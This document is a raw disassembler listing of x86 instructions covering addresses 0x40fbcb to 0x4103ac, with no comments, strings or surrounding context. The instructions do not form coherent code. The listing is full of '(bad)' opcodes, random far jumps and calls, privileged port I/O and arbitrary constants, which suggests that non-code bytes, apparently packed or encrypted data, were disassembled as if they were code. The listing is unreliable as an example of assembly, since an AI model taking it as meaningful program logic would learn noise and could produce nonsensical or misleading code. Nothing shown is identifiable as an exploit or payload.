  40fbcb:	adc    eax,0x4ab5fe89
  40fbd0:	ror    BYTE PTR [esi+edi*8-0x7aaf3690],1
  40fbd7:	lea    edi,[edi-0x6a6d6ff0]
  40fbdd:	and    eax,0x1018c5e8
  40fbe2:	sub    edx,DWORD PTR [edx+0x3d]
  40fbe5:	or     BYTE PTR [ecx-0x6d],dl
  40fbe8:	leave  
  40fbe9:	iret   
  40fbea:	sub    DWORD PTR [eax+ebx*1+0x15],0xffffffc1
  40fbef:	(bad)  
  40fbf0:	in     eax,dx
  40fbf1:	fcomp  QWORD PTR ds:0xc0621677
  40fbf7:	cmp    ch,BYTE PTR [bx-0x21da]
  40fbfc:	stc    
  40fbfd:	pop    ss
  40fbfe:	or     DWORD PTR [ecx+0x5ec930c0],0x1f
  40fc05:	and    ebp,esp
  40fc07:	jl     0x40fbf9
  40fc09:	mov    dh,0x62
  40fc0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc0c:	adc    eax,0x194ab1a4
  40fc11:	shl    DWORD PTR [eax+0x59],0x8c
  40fc15:	test   eax,0xa428d773
  40fc1a:	into   
  40fc1b:	jecxz  0x40fc4a
  40fc1d:	sbb    cl,cl
  40fc1f:	lea    ebp,[ebp+0x9]
  40fc22:	xchg   edx,eax
  40fc23:	(bad)  
  40fc24:	out    0xdd,al
  40fc26:	push   ds
  40fc27:	mov    esi,0x2c48dde
  40fc2c:	pop    esp
  40fc2d:	xlat   BYTE PTR ds:[ebx]
  40fc2e:	es leave 
  40fc30:	xor    dl,0x5c
  40fc33:	test   DWORD PTR [eax-0x2879b178],ebp
  40fc39:	sbb    bl,bl
  40fc3b:	pusha  
  40fc3c:	ss pop ebp
  40fc3e:	sub    BYTE PTR [ecx],dl
  40fc40:	sub    al,0x99
  40fc42:	mov    eax,ds:0x61fc5065
  40fc47:	fist   WORD PTR [esp+esi*1-0x62e3c760]
  40fc4e:	in     eax,0xce
  40fc50:	imul   esi,DWORD PTR [edi],0x88605e74
  40fc56:	jmp    0x1f7f2220
  40fc5b:	adc    esp,0xb44370a1
  40fc61:	mov    al,0x77
  40fc63:	ret    0x53e8
  40fc66:	lods   eax,DWORD PTR ds:[esi]
  40fc67:	mov    dh,0xb6
  40fc69:	pop    ebp
  40fc6a:	push   0x5adb96ef
  40fc6f:	mov    edx,0x8c4d6e98
  40fc74:	fist   WORD PTR [edx-0x1ddee9c0]
  40fc7a:	aam    0xc8
  40fc7c:	sbb    ebx,DWORD PTR [ebx-0x399e7508]
  40fc82:	lahf   
  40fc83:	addr16 pop es
  40fc85:	or     eax,0x889ad2bf
  40fc8a:	(bad)  
  40fc8b:	mul    cl
  40fc8d:	cs push ds
  40fc8f:	je     0x40fd06
  40fc91:	fs cmp al,0xc1
  40fc94:	pop    eax
  40fc95:	sbb    BYTE PTR [esi],bh
  40fc97:	push   es
  40fc98:	mov    dh,BYTE PTR [edi-0x2a]
  40fc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc9c:	loop   0x40fc2a
  40fc9e:	loope  0x40fc8e
  40fca0:	add    ah,dh
  40fca2:	out    dx,eax
  40fca3:	dec    esp
  40fca4:	jns    0x40fcbf
  40fca6:	cdq    
  40fca7:	adc    DWORD PTR [eax],edi
  40fca9:	jmp    0xffd2d642
  40fcae:	cmp    dh,BYTE PTR [esi]
  40fcb0:	add    eax,0xa01d6ebb
  40fcb5:	add    edi,DWORD PTR [eax+ebx*8]
  40fcb8:	inc    ebp
  40fcb9:	js     0x40fcc1
  40fcbb:	jmp    0x9192d8dd
  40fcc0:	mov    esi,0x9cf2ac90
  40fcc5:	repnz lea ecx,gs:[edx+edi*1-0x5d5eea8e]
  40fcce:	popa   
  40fccf:	cmc    
  40fcd0:	adc    DWORD PTR [edx-0x7f],0x3f
  40fcd4:	sub    al,0x65
  40fcd6:	dec    ebx
  40fcd7:	lods   al,BYTE PTR ds:[esi]
  40fcd8:	inc    ecx
  40fcd9:	call   0xbead:0xda704cc7
  40fce0:	sub    ebx,DWORD PTR [ecx]
  40fce2:	inc    eax
  40fce3:	aaa    
  40fce4:	imul   ebp,esp,0x64
  40fce7:	cmp    esi,edi
  40fce9:	ja     0x40fcc2
  40fceb:	neg    ebp
  40fced:	retf   0x1052
  40fcf0:	repz adc ebp,DWORD PTR [ebx-0x496685aa]
  40fcf7:	mov    edi,0xa7a89d2
  40fcfc:	inc    edi
  40fcfd:	(bad)  
  40fcfe:	daa    
  40fcff:	mul    BYTE PTR [eax+ebp*8]
  40fd02:	stc    
  40fd03:	mov    al,ds:0x954732b9
  40fd08:	retf   
  40fd09:	xchg   esi,eax
  40fd0a:	sub    bl,ah
  40fd0c:	aaa    
  40fd0d:	test   al,0x5a
  40fd0f:	ss push ebp
  40fd11:	add    BYTE PTR [edi+0x21],ch
  40fd14:	lea    esi,[esi+0x6c605ed]
  40fd1a:	(bad)  
  40fd1b:	das    
  40fd1c:	mov    ah,0xe4
  40fd1e:	add    eax,0xf44a01e9
  40fd23:	outs   dx,BYTE PTR ds:[esi]
  40fd24:	pop    esi
  40fd25:	stos   BYTE PTR es:[edi],al
  40fd26:	push   bx
  40fd28:	aam    0x5c
  40fd2a:	popf   
  40fd2b:	out    0xbd,eax
  40fd2d:	cwde   
  40fd2e:	pop    ds
  40fd2f:	bound  eax,QWORD PTR [ecx]
  40fd31:	push   ebp
  40fd32:	mov    gs,WORD PTR [edx+0x68004b87]
  40fd38:	sar    DWORD PTR [edx-0x3e6cfc1b],0xbb
  40fd3f:	call   0xe4745dc1
  40fd44:	jne    0x40fd6d
  40fd46:	sbb    al,0xc9
  40fd48:	mov    al,ds:0x20fc672e
  40fd4d:	int    0x79
  40fd4f:	shr    DWORD PTR [ecx+0x69],cl
  40fd52:	xor    ecx,edi
  40fd54:	cmc    
  40fd55:	jp     0x40fdb6
  40fd57:	(bad)  
  40fd58:	data16 aaa 
  40fd5a:	push   ebp
  40fd5b:	imul   eax,DWORD PTR es:[esi],0xffffffc3
  40fd5f:	or     BYTE PTR [ecx-0x45206410],bl
  40fd65:	xor    edx,ebx
  40fd67:	mul    DWORD PTR [esi+0x4cb2b6bb]
  40fd6d:	xor    eax,0x606bbab0
  40fd72:	leave  
  40fd73:	push   es
  40fd74:	or     bh,ch
  40fd76:	push   ecx
  40fd77:	dec    edi
  40fd78:	cmp    eax,ebp
  40fd7a:	pop    esi
  40fd7b:	stos   BYTE PTR es:[edi],al
  40fd7c:	or     DWORD PTR [ecx],esp
  40fd7e:	push   esi
  40fd7f:	sbb    ebp,DWORD PTR ds:0x95954f47
  40fd85:	mov    eax,0x86e2733
  40fd8a:	cmp    bl,BYTE PTR [edi-0x11e8e75f]
  40fd90:	cmp    DWORD PTR [ebp+0xc],0x2951c689
  40fd97:	int3   
  40fd98:	xchg   edi,eax
  40fd99:	jmp    0x8933:0x72a0ca9c
  40fda0:	mov    ch,al
  40fda2:	sbb    DWORD PTR [ebx-0x3c],eax
  40fda5:	cmp    eax,0x8330cdc3
  40fdaa:	aam    0xf1
  40fdac:	xor    BYTE PTR [ecx],dh
  40fdae:	pop    esi
  40fdaf:	dec    ebx
  40fdb0:	jl     0x40fd93
  40fdb2:	leave  
  40fdb3:	out    0x4f,al
  40fdb5:	or     edi,DWORD PTR [edx+0x2e]
  40fdb8:	fcom   QWORD PTR [eax]
  40fdba:	ret    
  40fdbb:	hlt    
  40fdbc:	mov    eax,ds:0xfcf6f06f
  40fdc1:	inc    ecx
  40fdc2:	bound  ebx,QWORD PTR [edi]
  40fdc4:	into   
  40fdc5:	daa    
  40fdc6:	hlt    
  40fdc7:	mov    ebp,0x1a83901c
  40fdcc:	sbb    BYTE PTR [eax+0x18],bl
  40fdcf:	inc    esi
  40fdd0:	adc    DWORD PTR [edi-0x44],esp
  40fdd3:	or     DWORD PTR [edx-0x1a],eax
  40fdd6:	mul    BYTE PTR [edi]
  40fdd8:	mov    DWORD PTR [ecx-0x4a78a44d],esi
  40fdde:	daa    
  40fddf:	test   BYTE PTR [edx+eax*1-0x565f2704],cl
  40fde6:	xor    eax,0x499b10cb
  40fdeb:	jae    0x40fe4c
  40fded:	outs   dx,BYTE PTR ds:[esi]
  40fdee:	jle    0x40fd8a
  40fdf0:	loopne 0x40fdc4
  40fdf2:	aam    0xd0
  40fdf4:	loope  0x40fdfb
  40fdf6:	(bad)  
  40fdf8:	or     al,0xde
  40fdfa:	(bad)
  40fdfe:	jmp    0x1ef6:0x4f3021c0
  40fe05:	xor    DWORD PTR [ecx-0x52],0xfffffff5
  40fe09:	mov    bh,BYTE PTR [eax-0xcd6c9e]
  40fe0f:	jns    0x40fe8a
  40fe11:	int3   
  40fe12:	mov    ds:0xf426c064,al
  40fe17:	sti    
  40fe18:	adc    BYTE PTR [edi+0x9],bh
  40fe1b:	push   esi
  40fe1c:	ret    
  40fe1d:	and    edi,DWORD PTR [ecx+0x38]
  40fe20:	fs ss sub ax,0xddc4
  40fe26:	or     BYTE PTR [edi+0x37],ah
  40fe29:	inc    edi
  40fe2a:	shr    BYTE PTR [edx],cl
  40fe2c:	mov    ch,0xdc
  40fe2e:	push   ebx
  40fe2f:	jno    0x40fe09
  40fe31:	ret    
  40fe32:	dec    ebp
  40fe33:	mov    eax,ds:0x19aa658b
  40fe38:	adc    esp,ebx
  40fe3a:	fxch   st(5)
  40fe3c:	jecxz  0x40fe5c
  40fe3e:	xchg   edi,eax
  40fe3f:	sub    esi,DWORD PTR [eax-0x331e66a7]
  40fe45:	int    0xf2
  40fe47:	jmp    0x50b2:0xfde020fd
  40fe4e:	mov    cl,0x6e
  40fe50:	nop
  40fe51:	lock pop ecx
  40fe53:	cmp    al,0x78
  40fe55:	jns    0x40feca
  40fe57:	mov    eax,0x26de0fa1
  40fe5c:	arpl   WORD PTR [ecx],si
  40fe5e:	test   eax,0x9e908822
  40fe63:	cli    
  40fe64:	ret    0x316a
  40fe67:	int    0xed
  40fe69:	pop    ebx
  40fe6a:	jns    0x40fe45
  40fe6c:	clc    
  40fe6d:	xchg   edi,eax
  40fe6e:	mov    ebx,0x28ad4b56
  40fe73:	sbb    al,0xda
  40fe75:	pop    ds
  40fe76:	(bad)  
  40fe77:	push   ss
  40fe78:	xor    BYTE PTR ds:0xe42a3351,0xc0
  40fe7f:	cs jmp 0x624e3d1b
  40fe85:	mov    esi,ebx
  40fe87:	jns    0x40fe67
  40fe89:	cmp    al,0xa7
  40fe8b:	int3   
  40fe8c:	mov    edi,0xe20e433f
  40fe91:	sub    eax,0xd345d776
  40fe96:	hlt    
  40fe97:	mov    gs,WORD PTR [edx+0x7c]
  40fe9a:	mov    ah,0xce
  40fe9c:	fbld   TBYTE PTR [ebx]
  40fe9e:	pop    ecx
  40fe9f:	lock int 0x45
  40fea2:	hlt    
  40fea3:	dec    ecx
  40fea4:	mov    edi,0x6ccc2f20
  40fea9:	ficom  WORD PTR [esi+0x4d]
  40feac:	scas   al,BYTE PTR es:[edi]
  40fead:	mov    al,ds:0x8840809d
  40feb2:	add    al,BYTE PTR [edi-0x3c]
  40feb5:	jg     0x40fe3b
  40feb7:	stos   BYTE PTR es:[edi],al
  40feb8:	jnp    0x40fe81
  40feba:	xor    bh,BYTE PTR [ecx+0x7aac7f11]
  40fec0:	mov    bl,0x5
  40fec2:	retf   
  40fec3:	dec    esp
  40fec4:	or     eax,0x41e4194b
  40fec9:	aaa    
  40feca:	xchg   ecx,eax
  40fecb:	push   0xffffffb7
  40fecd:	jbe    0x40fe81
  40fecf:	bound  ebp,QWORD PTR [ecx+edi*1-0x13]
  40fed3:	test   BYTE PTR [esi+0x1],ah
  40fed6:	cmp    dh,bl
  40fed8:	adc    BYTE PTR [ecx+0x34],bl
  40fedb:	lods   eax,DWORD PTR ds:[esi]
  40fedc:	inc    esi
  40fedd:	mov    al,0x35
  40fedf:	mov    es,WORD PTR [eax+0x5c957bee]
  40fee5:	lods   al,BYTE PTR ds:[esi]
  40fee6:	out    0x0,eax
  40fee8:	sbb    BYTE PTR [ecx-0x2c40f755],ch
  40feee:	scas   eax,DWORD PTR es:[edi]
  40feef:	pop    ss
  40fef0:	fist   WORD PTR [ebx-0x69aba916]
  40fef6:	xor    BYTE PTR [ebx+0x44b0c0f3],cl
  40fefc:	fs lahf 
  40fefe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feff:	mov    edi,0xb9afcece
  40ff04:	xchg   esi,eax
  40ff05:	mov    esp,DWORD PTR [edx-0x67]
  40ff08:	ret    
  40ff09:	test   al,0x52
  40ff0b:	mov    WORD PTR [esp],cs
  40ff0e:	inc    BYTE PTR [eax]
  40ff10:	cmp    edx,DWORD PTR [edi]
  40ff12:	daa    
  40ff13:	ret    0xadf4
  40ff16:	xor    DWORD PTR [ebx+0x34],0x5b
  40ff1a:	imul   esi,DWORD PTR [edi+0x6a1122a7],0xfe2987b1
  40ff24:	sbb    DWORD PTR [edi-0x11],0x66
  40ff28:	mov    esp,0x90c0169c
  40ff2d:	jle    0x40ff90
  40ff2f:	pop    ebx
  40ff30:	ss loope 0x40fed2
  40ff33:	mov    ?,WORD PTR [eax]
  40ff35:	out    0x74,eax
  40ff37:	push   0xf07e2521
  40ff3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff3d:	pop    ebp
  40ff3e:	stos   BYTE PTR es:[edi],al
  40ff3f:	div    BYTE PTR [ebx+0x24e9ba90]
  40ff45:	adc    al,0x2c
  40ff47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff48:	(bad)  
  40ff49:	jg     0x40ff65
  40ff4b:	sub    al,0x91
  40ff4d:	retf   0x324d
  40ff50:	sbb    ecx,DWORD PTR [ecx]
  40ff52:	nop
  40ff53:	push   esp
  40ff54:	aam    0x22
  40ff56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff57:	inc    cx
  40ff59:	mov    al,ds:0x600ebecc
  40ff5e:	repnz mov cl,0xad
  40ff61:	test   eax,0x578b693e
  40ff66:	mov    ch,0x18
  40ff68:	lods   al,BYTE PTR ds:[esi]
  40ff69:	les    ebx,FWORD PTR [eax+0x26]
  40ff6c:	add    esi,DWORD PTR [edi+edi*8]
  40ff6f:	shl    edx,1
  40ff71:	adc    BYTE PTR [ebx],al
  40ff73:	cmp    ebx,DWORD PTR [esi-0x4]
  40ff76:	mov    eax,ds:0x875b012d
  40ff7b:	imul   eax,eax,0x55853d03
  40ff81:	jns    0x40ff27
  40ff83:	mov    al,ds:0x46cc9483
  40ff88:	aam    0x80
  40ff8a:	push   ds
  40ff8b:	aas    
  40ff8c:	jno    0x40ffe9
  40ff8e:	adc    DWORD PTR [edi-0x46],esp
  40ff91:	mov    BYTE PTR [esi+0x350586ad],al
  40ff97:	(bad)  
  40ff98:	std    
  40ff99:	dec    esp
  40ff9a:	mov    ebp,0x5dd4c141
  40ff9f:	shl    BYTE PTR [ecx],0x2a
  40ffa2:	iret   
  40ffa3:	sbb    DWORD PTR [esi+0x46aba06a],0xffffffa5
  40ffaa:	std    
  40ffab:	jl     0x40ff31
  40ffad:	(bad)  
  40ffae:	jmp    0x18e21389
  40ffb3:	ins    BYTE PTR es:[edi],dx
  40ffb4:	pop    esp
  40ffb5:	sub    ebp,DWORD PTR [esp+ecx*1]
  40ffb8:	mov    bl,ch
  40ffba:	ret    0xc4d7
  40ffbd:	stc    
  40ffbe:	sub    DWORD PTR [eax+edx*8+0x454862c9],0xf
  40ffc6:	or     eax,0xb71d51c5
  40ffcb:	ss shr DWORD PTR ss:[ebp+0x2301f20f],0xcd
  40ffd4:	mov    ch,0x63
  40ffd6:	sub    ebx,DWORD PTR [esi-0x12]
  40ffd9:	lds    edx,FWORD PTR [edx+0x60]
  40ffdc:	mov    eax,ds:0x4d547f1c
  40ffe1:	lds    ebp,FWORD PTR [esi]
  40ffe3:	mov    ebx,0x408d8ffd
  40ffe8:	xor    esp,DWORD PTR [ecx+ebp*1+0x6c]
  40ffec:	mov    al,ds:0xe27105e7
  40fff1:	push   edx
  40fff2:	mov    esp,?
  40fff4:	push   edx
  40fff5:	out    dx,al
  40fff6:	cs mov ah,0x75
  40fff9:	bound  edx,QWORD PTR [ebp-0x54]
  40fffc:	or     eax,0x98e1b7aa
  410001:	test   BYTE PTR [ebx-0x6fa04ac7],bh
  410007:	sahf   
  410008:	rol    DWORD PTR [eax-0x52],0xba
  41000c:	rcr    BYTE PTR [ebp+0x5a],1
  41000f:	jge    0x40ffa9
  410011:	jl     0x41004c
  410013:	push   edx
  410014:	das    
  410015:	in     eax,dx
  410016:	inc    esp
  410017:	test   eax,0x129a9d17
  41001c:	xlat   BYTE PTR ds:[ebx]
  41001d:	pop    ds
  41001e:	mov    bh,0x50
  410020:	cli    
  410021:	dec    esi
  410022:	pop    ds
  410023:	and    BYTE PTR [eax-0x32],cl
  410026:	pop    ds
  410027:	fld    TBYTE PTR [edi]
  410029:	push   ebx
  41002a:	ss mov esp,0x6576a241
  410030:	push   ds
  410031:	imul   BYTE PTR ds:0x575c2bd2
  410037:	mov    dh,0x46
  410039:	(bad)  
  41003a:	fld    QWORD PTR [ecx]
  41003c:	dec    ecx
  41003d:	push   0x23
  41003f:	xchg   esi,eax
  410040:	int    0x87
  410042:	loope  0x4100ab
  410044:	inc    esp
  410045:	jmp    0x7d84:0x6d18a3ad
  41004c:	xchg   ecx,eax
  41004d:	sub    ah,ch
  41004f:	push   eax
  410050:	xchg   esp,eax
  410051:	or     bl,BYTE PTR [ebp-0x40cfcaca]
  410057:	mov    eax,ds:0x1e30e3d8
  41005c:	data16 fsub DWORD PTR [ecx+0x37]
  410060:	jnp    0x410097
  410062:	pop    ss
  410063:	jg     0x4100c7
  410065:	pop    es
  410066:	stos   DWORD PTR es:[edi],eax
  410067:	adc    DWORD PTR [eax-0x7a860d3b],edx
  41006d:	mov    cl,0x98
  41006f:	repz pop esi
  410071:	es push ebx
  410073:	mov    edx,0xc702b09e
  410078:	inc    ecx
  410079:	test   eax,0x1f5a99f
  41007e:	popf   
  41007f:	test   BYTE PTR [ebp+0x21],0x11
  410083:	push   ss
  410084:	or     DWORD PTR ds:0xf5357303,esi
  41008a:	jecxz  0x410017
  41008c:	test   BYTE PTR [edx],cl
  41008e:	fstp   st(2)
  410090:	mov    esp,0x92ebd90c
  410095:	jle    0x4100e5
  410097:	mov    eax,0x2a12ff95
  41009c:	(bad)  
  41009d:	aaa    
  41009e:	jmp    0x2200:0xf845eaad
  4100a5:	mov    ebp,0xf61c0125
  4100aa:	xchg   ebp,edx
  4100ac:	sbb    DWORD PTR [ebp+0x78],esp
  4100af:	test   BYTE PTR ds:0xb0b7c748,bh
  4100b5:	adc    DWORD PTR ds:0x1dc812fd,0x7a
  4100bc:	adc    BYTE PTR [ecx+0x6d],ch
  4100bf:	and    al,BYTE PTR [esi]
  4100c1:	inc    edx
  4100c2:	cmp    eax,0xe96f3c5c
  4100c7:	inc    edx
  4100c8:	adc    eax,0xe8a29704
  4100cd:	in     al,dx
  4100ce:	sbb    esp,DWORD PTR [edx+0x359dff5]
  4100d4:	pop    ebx
  4100d5:	inc    esi
  4100d6:	jecxz  0x4100f3
  4100d8:	fimul  WORD PTR [ebp-0x69889d0d]
  4100de:	and    edi,DWORD PTR [edi+0x55]
  4100e1:	shl    ecx,cl
  4100e3:	in     eax,0x71
  4100e5:	ficom  WORD PTR [ebx+0x11]
  4100e8:	in     al,0xc2
  4100ea:	aaa    
  4100eb:	add    eax,0x3222261f
  4100f0:	in     eax,dx
  4100f1:	pop    es
  4100f2:	nop
  4100f3:	cmp    eax,0xe81e4256
  4100f8:	out    0xdd,al
  4100fa:	xchg   BYTE PTR [eax-0x734b336d],cl
  410100:	or     al,0x29
  410102:	pop    edi
  410103:	dec    ecx
  410104:	repnz cwde 
  410106:	in     eax,dx
  410107:	aad    0x5d
  410109:	inc    esi
  41010a:	pop    ss
  41010b:	mov    esp,ecx
  41010d:	fcomp  DWORD PTR [edx+0x404f7d51]
  410113:	inc    ecx
  410114:	pop    edx
  410115:	fucom  st(1)
  410117:	dec    DWORD PTR [ebx]
  410119:	retf   0x287d
  41011c:	cld    
  41011d:	icebp  
  41011e:	ror    BYTE PTR [esi],0xe2
  410121:	test   al,0xb3
  410123:	add    eax,0xb09f255
  410128:	stos   BYTE PTR es:[edi],al
  410129:	call   0x5eaa0083
  41012e:	rcr    DWORD PTR [edx-0x3b97e023],1
  410134:	sti    
  410135:	push   esp
  410136:	mov    esi,0x93db2f72
  41013b:	jne    0x4100ea
  41013d:	push   edi
  41013e:	out    dx,al
  41013f:	imul   edx,DWORD PTR [ecx],0x6b2b5a66
  410145:	xor    al,0x23
  410147:	ins    BYTE PTR es:[edi],dx
  410148:	stc    
  410149:	xchg   ebp,eax
  41014a:	sub    eax,0x7bb2414a
  41014f:	jmp    0x41013e
  410151:	mov    ds:0x38da8b6f,al
  410156:	test   DWORD PTR [ecx+0x12],esi
  410159:	scas   al,BYTE PTR es:[edi]
  41015a:	jnp    0x4101d3
  41015c:	add    al,BYTE PTR [ebx+0x1d900d91]
  410162:	or     eax,0xe201c06b
  410167:	(bad)  
  410168:	add    eax,0xb989c195
  41016d:	pop    ecx
  41016e:	push   ss
  41016f:	add    al,0xb7
  410171:	rol    DWORD PTR [ebx+0x44],0xe8
  410175:	fimul  DWORD PTR [esi]
  410177:	cmp    eax,0x22592c17
  41017c:	mov    ebx,0xb0549f34
  410181:	pop    ebp
  410182:	jbe    0x4101a5
  410184:	pushf  
  410185:	push   0x26cf1202
  41018a:	xor    dl,ah
  41018c:	or     dl,BYTE PTR [edi]
  41018e:	in     eax,dx
  41018f:	add    al,0xff
  410191:	imul   ebx,DWORD PTR [ecx],0xea33ac36
  410197:	xchg   ebp,eax
  410198:	mov    ecx,DWORD PTR [ebp+0x49]
  41019b:	xor    BYTE PTR [ecx+ecx*8-0x57],bl
  41019f:	in     eax,dx
  4101a0:	pop    edi
  4101a1:	xchg   BYTE PTR [esp+ecx*1-0x75100aa2],bh
  4101a8:	or     ebp,edx
  4101aa:	call   0xe3fe:0x65c2f406
  4101b1:	adc    BYTE PTR [ebp-0x6e9b75f0],ch
  4101b7:	jecxz  0x410219
  4101b9:	int3   
  4101ba:	mov    bh,0x2b
  4101bc:	ins    BYTE PTR es:[edi],dx
  4101bd:	xor    esp,DWORD PTR [edx+eiz*1+0x50521c45]
  4101c4:	dec    ecx
  4101c5:	dec    edx
  4101c6:	(bad)  
  4101c7:	and    al,0x1d
  4101c9:	scas   eax,DWORD PTR es:[edi]
  4101ca:	cmp    edi,edx
  4101cc:	push   ebx
  4101cd:	sub    edi,esp
  4101cf:	dec    ebx
  4101d0:	pushf  
  4101d1:	jmp    0x131:0x704ce8a1
  4101d8:	and    eax,0x111189f7
  4101dd:	mov    tr6,edi
  4101e0:	add    DWORD PTR [edi+0x3e],0x66edb041
  4101e7:	jo     0x4101b9
  4101e9:	movq   mm6,QWORD PTR [edi]
  4101ec:	push   es
  4101ed:	fstp   QWORD PTR [esi]
  4101ef:	cmp    eax,0xab588848
  4101f4:	inc    eax
  4101f5:	pop    esp
  4101f6:	lock push edx
  4101f8:	inc    edi
  4101f9:	(bad)  
  4101fa:	(bad)  
  4101fc:	adc    al,BYTE PTR [eax-0x39]
  4101ff:	push   ebx
  410200:	mov    edi,0xe68fb4bb
  410205:	ror    bl,0x39
  410208:	lds    cx,DWORD PTR [esi-0x2a]
  41020c:	ja     0x4101f2
  41020e:	mov    edx,edi
  410210:	stc    
  410211:	ds fwait
  410213:	cmp    al,0xca
  410215:	add    BYTE PTR [ebx-0x5c],dl
  410218:	or     al,0x17
  41021a:	call   0x1b1e:0xc73dda3d
  410221:	mov    ebx,DWORD PTR [esi-0x559860e4]
  410227:	mov    al,ds:0xd853a3b2
  41022c:	inc    ecx
  41022d:	and    ch,BYTE PTR [esi-0x22]
  410230:	inc    edx
  410231:	or     DWORD PTR [esi+esi*1+0x2564d395],0x37d1b937
  41023c:	push   0x1d4d4e38
  410241:	sub    DWORD PTR [ecx-0xfae3839],esi
  410247:	jl     0x4101ec
  410249:	jmp    edi
  41024b:	(bad)  
  41024c:	arpl   WORD PTR [ebx+ebp*8-0x4a],cx
  410250:	sbb    BYTE PTR [ebx-0x7424c348],0xf1
  410257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410258:	add    bh,BYTE PTR [esi-0x1e824370]
  41025e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41025f:	imul   ecx,edi,0xd1e58668
  410265:	ins    BYTE PTR es:[edi],dx
  410266:	sbb    BYTE PTR [edx-0x12],ch
  410269:	mov    WORD PTR [ebp-0x4d782514],ds
  41026f:	nop
  410270:	push   ebp
  410271:	dec    ecx
  410272:	push   ebx
  410273:	test   al,0x89
  410275:	or     al,0xd
  410277:	(bad)  
  410278:	ror    BYTE PTR [edi],1
  41027a:	fistp  QWORD PTR [eax]
  41027c:	adc    ah,BYTE PTR [esi+0x38]
  41027f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410280:	and    cl,dh
  410282:	sti    
  410283:	pushf  
  410284:	test   eax,0xfb7c76c9
  410289:	dec    esp
  41028a:	repz push ss
  41028c:	int3   
  41028d:	cmp    esp,eax
  41028f:	inc    ecx
  410290:	mov    eax,ecx
  410292:	xchg   ebx,eax
  410293:	outs   dx,BYTE PTR ds:[esi]
  410294:	mov    WORD PTR [edx-0x29],?
  410297:	jg     0x4102db
  410299:	mov    ch,0x19
  41029b:	sti    
  41029c:	sub    esp,DWORD PTR [ebx-0x4f]
  41029f:	mov    WORD PTR [ebp+0xa],gs
  4102a2:	inc    eax
  4102a3:	addr16 push ebp
  4102a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a6:	rol    DWORD PTR [ecx-0xd5de194],cl
  4102ac:	cmp    eax,edx
  4102ae:	(bad)  
  4102af:	pop    edi
  4102b0:	xchg   ebp,ebp
  4102b2:	xor    DWORD PTR [ebx],eax
  4102b4:	aaa    
  4102b5:	adc    eax,0xd4788c8d
  4102ba:	stos   DWORD PTR es:[edi],eax
  4102bb:	pop    ecx
  4102bc:	sub    BYTE PTR [ebx+0x612cfbe0],cl
  4102c2:	jbe    0x41026a
  4102c4:	test   BYTE PTR [edx+0x64476b6a],0xe8
  4102cb:	loope  0x410316
  4102cd:	cmp    al,0x84
  4102cf:	sub    BYTE PTR [edi+0x47],dh
  4102d2:	sub    dh,BYTE PTR [edx-0x4914aa9d]
  4102d8:	mov    ebp,0x405f43fd
  4102dd:	mov    cl,0xb2
  4102df:	push   0x5c409c61
  4102e4:	stos   DWORD PTR es:[edi],eax
  4102e5:	call   0x27d6:0x6d39a493
  4102ec:	outs   dx,BYTE PTR ds:[esi]
  4102ed:	inc    ebp
  4102ee:	punpckhbw mm2,QWORD PTR [edx+0x32f007a1]
  4102f5:	ss add eax,0xf2a57430
  4102fc:	xchg   edx,eax
  4102fd:	pop    DWORD PTR [ebx]
  4102ff:	mov    dl,0x96
  410301:	in     eax,dx
  410302:	and    al,0xf4
  410304:	push   ds
  410305:	scas   eax,DWORD PTR es:[edi]
  410306:	mov    dl,0xc1
  410308:	not    BYTE PTR [ecx+0x6d]
  41030b:	das    
  41030c:	outs   dx,DWORD PTR ds:[esi]
  41030d:	or     eax,0x64766de6
  410312:	clc    
  410313:	fsub   DWORD PTR [ecx+0x15]
  410316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410317:	adc    ch,BYTE PTR [ecx+0x263fb2b2]
  41031d:	cmp    BYTE PTR [edx],cl
  41031f:	dec    esp
  410320:	push   es
  410321:	cmp    al,0xab
  410323:	(bad)  
  410324:	xor    al,0xb5
  410326:	ins    BYTE PTR es:[edi],dx
  410327:	cmp    al,0x3b
  410329:	mov    edi,DWORD PTR [edi+0x1cc4d4d]
  41032f:	(bad)  [eax-0x68]
  410332:	fs cmc 
  410334:	mov    ds:0xd86bd5e2,eax
  410339:	es es cmp eax,0x6221976d
  410340:	(bad)
  410344:	fcmovnbe st,st(0)
  410346:	out    0x22,al
  410348:	jnp    0x41036b
  41034a:	xchg   esi,eax
  41034b:	push   edi
  41034c:	dec    esi
  41034d:	sub    eax,0x5516bd9d
  410352:	jbe    0x4102f6
  410354:	dec    ecx
  410355:	pop    ds
  410356:	dec    esp
  410357:	out    dx,eax
  410358:	cmc    
  410359:	stos   BYTE PTR es:[edi],al
  41035a:	mov    dh,0xf3
  41035c:	adc    DWORD PTR [edi],0xffffffb3
  41035f:	inc    ebx
  410360:	xchg   edi,eax
  410361:	push   0x7009c2c
  410366:	inc    ecx
  410367:	(bad)  
  410368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410369:	mov    ds:0xac335f4b,al
  41036e:	dec    edx
  41036f:	aad    0x20
  410371:	xchg   ebp,eax
  410372:	or     BYTE PTR [edi+eax*2-0x3976ac6e],0x8e
  41037a:	shl    BYTE PTR [esi-0x71],0x2b
  41037e:	sbb    esp,DWORD PTR [ecx]
  410380:	jo     0x4103db
  410382:	data16 jo 0x4103cb
  410385:	pop    esp
  410386:	out    dx,eax
  410387:	inc    esp
  410388:	aad    0x1e
  41038a:	shr    BYTE PTR [edx+0x4c],cl
  41038d:	or     ecx,DWORD PTR [edx-0x75]
  410390:	loopne 0x410312
  410392:	scas   eax,DWORD PTR es:[edi]
  410393:	and    al,0xd2
  410395:	cmp    ah,cl
  410397:	test   eax,0xae486389
  41039c:	sub    DWORD PTR [eax+0x1309aae9],ecx
  4103a2:	dec    DWORD PTR [esi-0x30]
  4103a5:	push   cs
  4103a6:	je     0x41037d
  4103a8:	pop    ds
  4103a9:	cmc    
  4103aa:	int3   
  4103ab:	(bad)  
  4103ac:	lock in al,dx
